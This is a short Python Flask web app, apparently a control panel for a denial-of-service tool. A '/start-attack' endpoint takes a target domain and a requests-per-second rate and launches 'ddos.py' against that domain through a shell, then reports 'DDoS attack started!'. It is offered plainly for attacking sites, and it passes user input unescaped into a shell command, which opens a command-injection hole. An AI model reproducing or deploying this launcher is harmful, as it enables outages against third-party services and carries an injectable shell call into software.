from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/start-attack', methods=['POST'])
def start_attack():
    data = request.json
    domain = data.get('domain')
    rps = data.get('rps')
    
    if not domain or not rps:
        return jsonify({'message': 'Domain and Requests per Second are required!'}), 400

    command = f'python3 ddos.py domain {domain} {rps}'
    process = subprocess.Popen(command, shell=True)

    return jsonify({'message': 'DDoS attack started!'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
